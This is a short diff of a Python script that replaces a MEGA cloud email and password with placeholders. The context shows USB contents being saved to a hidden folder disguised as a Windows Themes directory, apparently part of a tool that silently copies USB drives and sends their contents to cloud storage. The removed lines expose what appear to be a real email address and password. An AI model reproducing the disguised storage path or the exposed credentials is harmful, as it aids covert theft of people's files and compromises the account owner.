@@ -7,8 +7,8 @@ import subprocess
 import sys
 
 # MEGA credentials
-MEGA_EMAIL = "hamclofashionstore@gmail.com"  # Replace with your MEGA email
-MEGA_PASSWORD = "HamzaHashim996696$"  # Replace with your MEGA password
+MEGA_EMAIL = "email@email.com"  # Replace with your MEGA email
+MEGA_PASSWORD = "password123"  # Replace with your MEGA password
 
 # Base directory to save USB contents locally
 BASE_SAVE_DIR = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Themes", "Themes")
